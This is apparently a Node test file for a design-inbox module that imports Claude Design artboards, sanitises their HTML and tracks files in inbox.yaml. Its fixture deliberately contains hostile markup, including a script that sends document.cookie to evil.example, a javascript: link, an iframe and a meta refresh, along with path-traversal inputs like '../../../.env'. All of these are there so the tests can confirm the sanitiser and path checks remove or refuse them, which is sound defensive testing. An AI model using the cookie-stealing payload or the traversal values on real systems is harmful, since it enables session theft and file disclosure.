import { test } from 'node:test';
import assert from 'node:assert/strict';
import { artifactLinks, boardsOf, inboxEntry, inboxProblems, keptFile, readInbox, readableArtboard, sha256, sourceKind, stripCanvas, withEntry, writeInbox } from '../../lib/quality/design-inbox.mjs';
import { readRegistry } from '../../lib/quality/screen-codes.mjs';

// The shape of the artifact "Landing page hero" (Phiên 35 · Lượt 80), its artboard renamed after its screen code.
const canvas = (boards = { 'USR-HOME01.dc.html': { x: 0, y: 0, w: 1440, h: 760, expand: 'fill', title: 'USR-HOME01 · Hero' } }) => JSON.stringify({
  v: 3,
  title: 'Landing page hero',
  boards,
  order: Object.keys(boards),
  designSystems: [{ title: 'Lumen', namespace: 'lumen', artifact: 'https://claude.ai/code/artifact/93305d92-b3b9-4969-8bd0-2708e02d255d', version: null }],
});
const ARTBOARD = [
  '<!doctype html>',
  '<html lang="vi">',
  '<head><title>Hero</title><script src="./support.js"></script></head>',
  '<body>',
  '<x-dc>',
  '<helmet><link href="https://fonts.googleapis.com/css2?family=Inter" rel="stylesheet"><style>body{margin:0}</style></helmet>',
  '<a class="btn" href="#dung-thu" onclick="steal()" style="color:#1f5f4a">Dùng thử</a>',
  '<a href="javascript:alert(1)">x</a><iframe src="https://evil.example/"></iframe><meta http-equiv="refresh" content="0;url=https://evil.example/">',
  '<script>fetch("https://evil.example/?" + document.cookie)</script>',
  '</x-dc>',
  '<script type="text/x-dc" data-dc-script>class Component extends DCLogic { renderVals() { return {}; } }</script>',
  '</body>',
  '</html>',
].join('\n');
const LINK = 'https://claude.ai/artifact/4MHNq6Tk2x3o31S4RVXD5V';

test('the links of Claude artifacts in a description, each once; a standalone Claude Design link is none', () => {
  const text = `Hero: ${LINK} (USR-HOME01)\nDS: https://claude.ai/code/artifact/93305d92-b3b9-4969-8bd0-2708e02d255d.\nLại ${LINK}\nCũ: https://claude.ai/design/p/1c62be76-f099-48af-969b-d7bd990ce472`;
  assert.deepEqual(artifactLinks(text), [LINK, 'https://claude.ai/code/artifact/93305d92-b3b9-4969-8bd0-2708e02d255d']);
  assert.deepEqual(artifactLinks(`${LINK}/extra`), []);
});

test('the inbox keeps the source files of a Design or a Design System, never the type code or an instruction file', () => {
  for (const path of ['project/canvas.json', 'project/USR-HOME01.dc.html', 'project/ds/lumen/tokens.json', 'project/tokens.json', 'project/README.md', 'project/design-system.json', 'project/components/Cover/preview.html']) assert.ok(keptFile(path), path);
  for (const path of ['index.html', 'SKILL.md', 'artifact-type/app.js', 'project/CLAUDE.md', 'project/claude.md', 'project/AGENTS.md', 'project/.claude/settings.json', 'project/../x.dc.html', 'project/sub/x.dc.html', 'project/ds/lumen/CLAUDE.md']) assert.ok(!keptFile(path), path);
  assert.equal(sourceKind(['project/canvas.json', 'project/USR-HOME01.dc.html']), 'design');
  assert.equal(sourceKind(['project/README.md', 'project/tokens.json']), 'design-system');
  assert.equal(sourceKind(['index.html']), null);
});

test('the screens of a Design come from its artboards: the code from the file name, the name from the title', () => {
  const read = boardsOf(canvas({
    'USR-HOME01.dc.html': { w: 1440, h: 760, title: 'USR-HOME01 · Trang chủ' },
    'USR-HOME01-mobile.dc.html': { w: 390, h: 844, title: 'USR-HOME01 · Trang chủ' },
  }));
  assert.deepEqual(read.screens.map(({ code, variant, name, file, width }) => `${code} ${variant} ${name} ${file} ${width}`), ['USR-HOME01 null Trang chủ project/USR-HOME01.dc.html 1440', 'USR-HOME01 mobile Trang chủ project/USR-HOME01-mobile.dc.html 390']);
  assert.deepEqual(read.systems, [{ title: 'Lumen', url: 'https://claude.ai/code/artifact/93305d92-b3b9-4969-8bd0-2708e02d255d' }]);
  assert.deepEqual(read.problems, []);
  // The artboard as Claude Design names it at first: no code. A code with a hyphen before its digits is none either.
  assert.match(boardsOf(canvas({ 'Main.dc.html': { title: 'Hero' } })).problems[0], /^the artboard Main\.dc\.html has no screen code in its file name: name it after its code, such as USR-CART01\.dc\.html/);
  assert.match(boardsOf(canvas({ 'USR-HOME-01.dc.html': { title: 'USR-HOME-01 · Hero' } })).problems[0], /has no screen code in its file name/);
  assert.match(boardsOf(canvas({ 'USR-HOME01.dc.html': { title: 'Hero' } })).problems[0], /^the title of the artboard USR-HOME01\.dc\.html is "Hero": it starts with "USR-HOME01 · "/);
  assert.match(boardsOf(canvas({ '../x.dc.html': { title: 'x' } })).problems[0], /has a name the inbox does not take/);
  assert.match(boardsOf('{').problems[0], /^canvas\.json does not parse/);
});

test('an artboard renders with no script: its helmet goes to head, scripts, handlers, frames and refresh go, and a CSP closes the rest', () => {
  const { html, dynamic } = stripCanvas(ARTBOARD);
  assert.equal(dynamic, false);
  assert.match(html, /^<!doctype html>\n<html lang="vi">/);
  assert.match(html, /<meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline' https:\/\/fonts\.googleapis\.com; font-src https:\/\/fonts\.gstatic\.com; img-src 'self' data:">/);
  assert.match(html, /<link href="https:\/\/fonts\.googleapis\.com\/css2\?family=Inter" rel="stylesheet">/);
  assert.match(html, /<a class="btn" href="#dung-thu" style="color:#1f5f4a">Dùng thử<\/a>/);
  for (const gone of [/<script/i, /onclick/i, /javascript:/i, /<iframe/i, /http-equiv="refresh"/i, /evil\.example/, /<x-dc>/, /<helmet>/]) assert.doesNotMatch(html, gone);
  assert.equal(stripCanvas(ARTBOARD.replace('Dùng thử', '{{ title }}')).dynamic, true);
  assert.equal(stripCanvas(ARTBOARD.replace('Dùng thử', '<sc-for list="{{ items }}" as="item"></sc-for>')).dynamic, true);
  assert.match(stripCanvas('<html><body>x</body></html>').problem, /has no <x-dc> element/);
  // Threat model of item 10: only the stylesheet of Google Fonts stays among the links.
  const links = stripCanvas(ARTBOARD.replace('<style>', '<link rel="prefetch" href="https://evil.example/a"><link rel="stylesheet" href="https://evil.example/b.css"><style>')).html;
  assert.doesNotMatch(links, /evil\.example/);
  assert.match(links, /fonts\.googleapis\.com\/css2\?family=Inter/);
});

test('render reads only an artboard add could have written: inbox.yaml sits in .ai/, which agents write', () => {
  assert.ok(readableArtboard('4MHNq6Tk2x3o31S4RVXD5V', 'project/USR-HOME01.dc.html'));
  for (const [dir, file] of [['..', 'project/USR-HOME01.dc.html'], ['4MHNq6Tk2x3o31S4RVXD5V', '../../../.env'], ['4MHNq6Tk2x3o31S4RVXD5V', 'project/../x.dc.html'], ['4MHNq6Tk2x3o31S4RVXD5V', 'project/sub/x.dc.html'], ['4MHNq6Tk2x3o31S4RVXD5V', 'project/canvas.json'], ['a/b', 'project/x.dc.html']]) {
    assert.equal(readableArtboard(dir, file), false, `${dir} ${file}`);
  }
});

test('inbox.yaml: one entry a link, with its version, the hash of each file and the screens; written and read back', () => {
  const files = [{ path: 'project/canvas.json', bytes: Buffer.from(canvas()) }, { path: 'project/USR-HOME01.dc.html', bytes: Buffer.from(ARTBOARD) }];
  const entry = inboxEntry({ url: LINK, version: '1795459699-c1d6', title: 'Landing page hero', files, now: Date.parse('2026-11-24T03:00:00Z') });
  assert.equal(entry.kind, 'claude-design');
  assert.equal(entry.dir, '4MHNq6Tk2x3o31S4RVXD5V');
  assert.equal(entry.files[1].sha256, sha256(Buffer.from(ARTBOARD)));
  assert.deepEqual(entry.screens.map(({ code, name, shots }) => `${code} ${name} ${shots.length}`), ['USR-HOME01 Hero 0']);
  const inbox = withEntry(withEntry({ key: 'SHOP-120', sources: [] }, entry), { ...entry, version: 'newer' });
  assert.equal(inbox.sources.length, 1, 'the same link again replaces its entry');
  const back = readInbox(writeInbox(inbox));
  assert.equal(back.key, 'SHOP-120');
  assert.equal(back.sources[0].version, 'newer');
  assert.throws(() => readInbox('key: SHOP-1\n'), /has no list sources/);
});

test('the problems of an inbox: a link not taken, a file missing or changed, an artboard without its code, a screen without an image', () => {
  const files = [{ path: 'project/canvas.json', bytes: Buffer.from(canvas()) }, { path: 'project/USR-HOME01.dc.html', bytes: Buffer.from(ARTBOARD) }];
  const entry = inboxEntry({ url: LINK, version: 'v1', title: 'Landing page hero', files });
  const inbox = { key: 'SHOP-120', sources: [{ ...entry, screens: entry.screens.map((s) => ({ ...s, shots: ['shots/USR-HOME01-desktop.png'] })) }] };
  const onDisk = new Map(files.map(({ path, bytes }) => [`4MHNq6Tk2x3o31S4RVXD5V/${path}`, bytes]));
  const registry = readRegistry('## Apps\n\n| Prefix | App |\n|---|---|\n| USR | user |\n\n## Areas\n\n| Area | Meaning |\n|---|---|\n| HOME | Trang chủ |\n\n## Screens\n\n| Code | Name | App | Route | Epic | State |\n|---|---|---|---|---|---|\n| USR-HOME01 | Trang chủ | user | / | SHOP-1 | dùng |\n');
  assert.deepEqual(inboxProblems(inbox, { files: onDisk, registry, links: [LINK] }), []);
  assert.deepEqual(inboxProblems(inbox, { files: onDisk, registry, links: [LINK, 'https://claude.ai/artifact/KBBSLaVz8cHnCY9Vo57rj6'] }), ['https://claude.ai/artifact/KBBSLaVz8cHnCY9Vo57rj6 is linked from the item but not in the inbox: /ao-design takes it']);
  const changed = new Map(onDisk);
  changed.set('4MHNq6Tk2x3o31S4RVXD5V/project/USR-HOME01.dc.html', Buffer.from(`${ARTBOARD}\n<!-- edited -->`));
  assert.deepEqual(inboxProblems(inbox, { files: changed, registry }), ['4MHNq6Tk2x3o31S4RVXD5V/project/USR-HOME01.dc.html changed after it was taken: take the artifact again with /ao-design']);
  const missing = new Map(onDisk);
  missing.delete('4MHNq6Tk2x3o31S4RVXD5V/project/USR-HOME01.dc.html');
  assert.deepEqual(inboxProblems(inbox, { files: missing, registry }), ['4MHNq6Tk2x3o31S4RVXD5V/project/USR-HOME01.dc.html is missing']);
  const retired = readRegistry(registry ? '## Apps\n\n| Prefix | App |\n|---|---|\n| USR | user |\n\n## Areas\n\n| Area | Meaning |\n|---|---|\n| HOME | Trang chủ |\n\n## Screens\n\n| Code | Name | App | Route | Epic | State |\n|---|---|---|---|---|---|\n| USR-HOME01 | Cũ | user | /old | SHOP-1 | bỏ |\n' : '');
  assert.deepEqual(inboxProblems(inbox, { files: onDisk, registry: retired }), ['USR-HOME01 is retired in docs/design-system/screens.md: give project/USR-HOME01.dc.html a new code']);
  const noShot = { ...inbox, sources: [entry] };
  assert.deepEqual(inboxProblems(noShot, { files: onDisk, registry }), ['USR-HOME01 (Hero) has no image yet: run render, or put a screenshot of it in the inbox']);
  const forged = { ...inbox, sources: [{ ...inbox.sources[0], files: [...entry.files, { path: 'project/CLAUDE.md', sha256: 'x' }] }] };
  assert.deepEqual(inboxProblems(forged, { files: onDisk, registry }), ['4MHNq6Tk2x3o31S4RVXD5V/project/CLAUDE.md is not a file the inbox keeps']);
});
